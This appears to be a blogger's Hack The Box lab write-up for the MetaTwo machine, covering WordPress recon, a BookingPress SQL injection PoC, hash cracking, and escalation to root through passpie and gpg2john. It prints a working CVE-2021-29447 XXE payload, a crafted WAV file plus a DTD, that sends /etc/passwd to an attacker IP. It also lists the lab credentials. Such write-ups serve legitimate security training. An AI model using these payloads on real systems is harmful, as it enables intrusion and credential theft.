---
title: 'HTB-MetaTwo'
published: 2025-09-18
draft: false
toc: true
---
**Start 08:39 22-09-2025**

---
```
Scope:
10.10.11.186
```
# Recon
## Nmap

```bash
sudo nmap -sV -sC -sT -p- metatwo.htb -T5 --min-rate=5000 -vvvv -Pn

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp?    syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
```

## 80/TCP - HTTP

I used `gobuster` to enumerate the website and noticed that it was running **WordPress**:

![](attachments/60d36b0b2c1e64e166279f9ec16a251a.png)

Heading over to the site we notice a simple landing page:

![](attachments/66b62da3152b566a6b1460fa4453e46a.png)

I then headed over to `/wp-admin` to try and login using default creds:

![](attachments/712069ef6c7f14491f9b02b3bcc62f4b.png)

![](attachments/18f92110f89ff1969d8c5d9746f93287.png)

This tells us that the user *admin* does exist. 

:::note
We can possibly brute-force it in case `xmlrpc` is enabled
:::

### wpscan

![](attachments/f85bf28232ef588e424e0a1957b6fc8f.png)

Running `wpscan` we notice that it's in fact enabled meeaning we can try to throw a wordlist against it. But first we'll check further down for the results.

![](attachments/d16ca75dddc58b17dee0ed1431c949af.png)

:::note
The `twentytwentyone` theme is vulnerable, once we're inside we can get a webshell/reverse shell by modifying the `404.php` page in order to achieve the desired results.
:::

### brute forcing xmlrpc - FAIL

Using the following command I try to brute force the *admin* credentials:

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://metapress.htb/ --ignore-main-redirect 
```

![](attachments/f9a6bac8ffbefb1ce6dd52eb1f0682e1.png)

This took way too long however so naturally I continued on while leaving the brute force running.

I also found another user using the following command:

```bash
sudo wpscan --enumerate u -t 20 --url http://metapress.htb/ --ignore-main-redirect
```

![](attachments/a30031a7aec16d2a5054230cc806fcae.png)

I then tried out brute forcing *manager* as well.

### XSS in search parameter - FAIL

Back on the main page I found a **Search** input bar:

![](attachments/9b032fb84a8fba6681cafd7ce526370f.png)

Here I could enter anything I wanted and got the following result:

![](attachments/3898c5dc331d759f3131884f2cd84089.png)

Analyzing the request further in `burp` yielded this result:

![](attachments/89642c6ef6ec1ab1c61d7c7285c5d326.png)

I tried to see whether this was injectable using **XSS**:

![](attachments/258b3744880e31f71dd36d9dce6307b1.png)

I then tried out `xsstrike` and got some false positives which didn't end up working.

![](attachments/3664eb845cd64238cc5cc9d01c40fae7.png)

Moving on

### Page source enum

Clearly I was still missing something so I went ahead and enumerated the other page that was accessible:

![](attachments/e57ed79d31082917fa35ff180765408c.png)

```bash
curl -s http://metapress.htb/events/ | grep plugins
```

![](attachments/29e066200603ef8da91a1fee5483f042.png)

Above I found another plugin that wasn't found by `wpscan` on the mainpage, namely **bookingpress-appointment-booking**.

![](attachments/a37358293d2ee01624c0b728c32629b3.png)

I then looked up the version to see whether it's exploitable.

![](attachments/c9223e0bf257e9801dbac4685788bc05.png)

There's a PoC on `github` available.

# Foothold
## CVE-2022-0739 - PoC 

I went ahead and used [this PoC from github](https://github.com/destr4ct/CVE-2022-0739/blob/main/booking-press-expl.py):

![](attachments/f7c1e7be4d9bc096463d230cf91b082c.png)

As for the nonce it's mentioning, we can find it in this request:

![](attachments/a4647354567cb8dd634e1c69f854d68d.png)

Combining the two we get the following result:

![](attachments/50c4f625f25a33a2dfd070e2bdcbf2b2.png)

We can try and crack these hashes.

![](attachments/69dd96e9dea02c9a9e44b03998fc3c89.png)

### Hash cracking

We'll be using mode `400` as per the docs:

![](attachments/c8024b01b2db2e072ef6435497c03a77.png)

![](attachments/94e8f4b8962ac415d7a35f9ce02d8e76.png)

![](attachments/067042d5d9406352575e457b7f55d704.png)

```
manager
partylikearockstar
```

We can now go ahead and use these creds to log in.

![](attachments/ffac70941bf819c569018e9c562287a3.png)

## CVE-2021-29447 - XXE

I started looking around for exploits for this **WordPress** instance: 

![](attachments/c1703d169adba3c074cc11919e49c1df.png)

Clicking on it I read the following:

![](attachments/a8db54f5f5e731589e8da9c1f65f7fe0.png)

### PoC 

We'll basically need 2 files:

`malicious.wav`:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.5:80/xxe.dtd'"'"'>%remote;%init;%trick;] >\x00'> malicious.wav
```

And `xxe.dtd`:

```xml
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://10.10.14.5/?p=%file;'>" >
```

We then go ahead and upload the file:

![](attachments/4d8cb4b19ea6fe442049b936af8af694.png)

Once we click it we get the response:

![](attachments/18e00e1535b52bfc28592f1c7c971dea.png)

Next up we can use the following script in order to decrypt the response:

```php
<?php

echo zlib_decode(base64_decode('jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw=='));
```

![](attachments/ebc88d8f78587abd8f7dc390a1a60682.png)

:::tldr
Through the **XXE** vulnerability we were able to retrieve the `/etc/passwd` file and find the *jnelson* user.
:::

I then tried to retrieve the `id_rsa` from this user:

![](attachments/e00a249c6059f9f40f81fcdd1aadce46.png)

Unfortunately I did not get a valid response:

![](attachments/b31ecf6662741939f6a4fbffbe0d261e.png)

So I tried out the following (with some variations until it worked):

![](attachments/b79b7b5f558c1034b3ad9f4d7ad676aa.png)

![](attachments/1c61f6dcea239153ead0fd681ead5530.png)

I then went ahead and pasted it inside the `decrypt.php` script again.

![](attachments/8f0e2a97bf702501211be62fcc38e4b6.png)

```
blog
635Aq@TdqrCwXFUZ
```

```
metapress.htb
9NYS_ii@FyL_p5M2NvJ
```

## 22/TCP - FTP

Using the latter creds we were indeed able to log into `ftp`:

![](attachments/65576360b959768ead1f486e5a7b26be.png)

Diving further into the `/mailer` directory we find:

![](attachments/31aaf849e51ec1916d1b7927cd03d812.png)

Reading the `send_email.php` file we find a set of `SSH` creds for *jnelson*:

![](attachments/fdc81bf4834c671002d339a7288efaf4.png)

```
jnelson
Cb4_JmWM8zUZWMu@Ys
```

## SSH as jnelson

![](attachments/0cdd0a628f389d44a97c7e38ce4bdd8f.png)

### user.txt

I was directly able to get the `user.txt` flag:

![](attachments/443ae0363e33ca36e5da55d6bf8bfe65.png)

## Enumeration

![](attachments/2671573badc18d808edd1984635f25bc.png)

Inside this `/home` directory however I was able to find some interesting stuff:

![](attachments/e382be0feb524f253028ad8dcb5f6a05.png)

Checking the `root.pass` yields us a a PGP encrypted message.

![](attachments/de794b5addd273342917e21f8c94ca32.png)

:::question
So what is **passpie**? 

![](attachments/28d24320965dfc59578304dc363cccc4.png)
:::

Simply using the `passpie` command outputs `*****`.

![](attachments/be6a3a9bba66619cf44823ab70cc1c9f.png)

Checking the version:

![](attachments/2d43e2a2c7f88e08a18476e495c14444.png)

But this yields no PoC's, instead I copy over the `.keys` output in order to try and crack it.

![](attachments/d1dbf7b79ae7ecf9ec7b42d15764b0ff.png)

# Privilege Escalation
## Hash cracking
### gpg2john

![](attachments/6be17687348a9c462783fac9f75bcfa9.png)

We can then crack it using `john`:

![](attachments/be3a39f8a30d618a85a0a52ff39f3513.png)

```
blink182
```

Using this passphrase we can gather all the creds:

![](attachments/8f7759458736dd2b53f5b6908eeca563.png)

```
root
p7qfAZt4_A1xo_0x
```

We can now use these creds to log in as *root*:

![](attachments/73bd81d4aff30dfb3685086c580a12d7.png)

### root.txt

![](attachments/654b409f53fcb0b41df16d71e44e7b77.png)

![](attachments/01ae70abedc18da73f05cf2e391ff539.png)

---

**Finished 11:06 22-09-2025**

[^Links]: [[Hack The Box]]

#XXE #Wordpress #CVE-2022-0739 #CVE-2021-29447 #gpg2john #passpie 
